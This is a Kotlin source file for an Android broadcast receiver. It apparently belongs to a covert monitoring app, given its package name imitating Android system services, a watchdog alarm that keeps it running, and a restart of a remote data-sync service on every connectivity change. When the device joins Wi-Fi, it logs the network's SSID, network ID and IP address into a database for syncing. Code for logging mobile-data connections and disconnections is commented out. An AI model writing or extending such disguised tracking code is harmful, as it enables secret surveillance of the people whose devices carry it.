package com.android.services.receiver

import android.annotation.SuppressLint
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkInfo
import android.net.wifi.WifiManager
import android.os.Handler
import android.os.Looper
import com.android.services.db.entities.ConnectedNetwork
import com.android.services.services.RemoteDataService
import com.android.services.util.*
import org.greenrobot.eventbus.EventBus
import java.math.BigInteger
import java.net.InetAddress
import java.nio.ByteOrder
import java.util.*
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class ConnectivityChangeReceiver : BroadcastReceiver() {

    @SuppressLint("MissingPermission")
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.net.conn.CONNECTIVITY_CHANGE") {
            val mConnectivityManager =
                context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val networkInfo = Objects.requireNonNull(mConnectivityManager).activeNetworkInfo
            val isConnected = networkInfo != null && networkInfo.isConnectedOrConnecting
            FirebasePushUtils.restartRemoteDataSyncService(context,false)
            val watchDogReceiver=WatchDogAlarmReceiver()
            watchDogReceiver.setAlarm(context)
            val executor: ExecutorService = Executors.newSingleThreadExecutor()
            executor.execute {
                if (isConnected && AppConstants.syncConnectedNetworks) {
                    onNetworkConnected(context, networkInfo)
                    EventBus.getDefault().post("networkConnected")
                } else {
                    onNetworkDisconnected(context)
                }
            }
        }
    }

    companion object {
        private val TAG = ConnectivityChangeReceiver::class.java.simpleName
        private fun onNetworkConnected(context: Context, networkInfo: NetworkInfo?) {
            if (networkInfo!!.type == ConnectivityManager.TYPE_WIFI) {
                try {
                    val wifiManager =
                        context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
                    val connectionInfo = Objects.requireNonNull(wifiManager).connectionInfo
                    if (connectionInfo != null) {
                        val networkSSID = connectionInfo.ssid
                        val networkId = connectionInfo.networkId
                        var networkIP = ""
                        var ip = connectionInfo.ipAddress
                        ip =
                            if (ByteOrder.nativeOrder() == ByteOrder.LITTLE_ENDIAN) Integer.reverseBytes(
                                ip
                            ) else ip
                        try {
                            val ipAddress = BigInteger.valueOf(ip.toLong()).toByteArray()
                            val inetAddress = InetAddress.getByAddress(ipAddress)
                            networkIP = inetAddress.hostAddress
                        } catch (e: Exception) {
                            logVerbose(TAG + " Error Getting IP Address: " + e.message)
                        }
                        val connectedNetwork = ConnectedNetwork()
                        if (networkSSID.isNotEmpty()) {
                            connectedNetwork.uniqueId = networkSSID
                            connectedNetwork.networkId = networkId.toString()
                            connectedNetwork.networkName = networkSSID
                            connectedNetwork.networkType = "Wifi"
                            connectedNetwork.ipAddress = networkIP
//                        connectedNetwork.dateTime =
//                            AppUtils.formatDate(System.currentTimeMillis().toString())
//                        connectedNetwork.connectionStatus = "1"
//                        connectedNetwork.OS = "1"
                            connectedNetwork.date = AppUtils.getDate(System.currentTimeMillis())
                            connectedNetwork.status = 0
                            val notExistsAlready =
                                InjectorUtils.provideConnectedNetworkRepository(context)
                                    .checkIfNetworkNotExistsAlready(networkSSID)
                            if (notExistsAlready) {
                                InjectorUtils.provideConnectedNetworkRepository(context)
                                    .insertConnectedNetwork(connectedNetwork)
                            }
                        }
                    }
                } catch (e: Exception) {
                    logVerbose(TAG + "Error Wifi Connected : " + e.message)
                }
            } else if (networkInfo.type == ConnectivityManager.TYPE_MOBILE) {
                try {
//                    val currentSystemTime = System.currentTimeMillis().toString()
//                    val connectedNetwork = ConnectedNetwork()
//                    connectedNetwork.uniqueId =
//                        AppUtils.md5Hash(AppUtils.generateUniqueID() + System.currentTimeMillis())
//                    connectedNetwork.networkId = currentSystemTime
//                    connectedNetwork.networkName =
//                        networkInfo.extraInfo + " [" + networkInfo.subtypeName + "]"
//                    connectedNetwork.networkType = "Mobile"
//                    connectedNetwork.ipAddress = ""
//                    connectedNetwork.dateTime =
//                        AppUtils.formatDate(System.currentTimeMillis().toString())
//                    connectedNetwork.connectionStatus = "1"
//                    connectedNetwork.OS = "1"
//                    connectedNetwork.date = AppUtils.getDate(System.currentTimeMillis())
//                    connectedNetwork.status = 0
//                    InjectorUtils.provideConnectedNetworkRepository(context)
//                        .insertConnectedNetwork(connectedNetwork)
                } catch (e: Exception) {
                    logVerbose(TAG + " Error Mobile Data Connected : " + e.message)
                }
            }
        }

        private fun onNetworkDisconnected(context: Context) {
            try {
//                val connectedNetworkRepository =
//                    InjectorUtils.provideConnectedNetworkRepository(context)
//                val connectedNetwork = connectedNetworkRepository.getLastConnectedNetwork()
//                if (connectedNetwork != null && connectedNetwork.connectionStatus == "1") {
//                    connectedNetwork.apply {
//                        this.uniqueId =
//                            AppUtils.md5Hash(AppUtils.generateUniqueID() + System.currentTimeMillis())
//                        this.dateTime = AppUtils.formatDate(System.currentTimeMillis().toString())
//                        this.connectionStatus = "0"
//                        this.date = AppUtils.getDate(System.currentTimeMillis())
//                        this.status = 0
//                    }
//                    connectedNetworkRepository.insertConnectedNetwork(connectedNetwork)
//                }
            } catch (e: Exception) {
                logVerbose("Error Getting LastConnected Network: " + e.message)
            }
        }
    }
}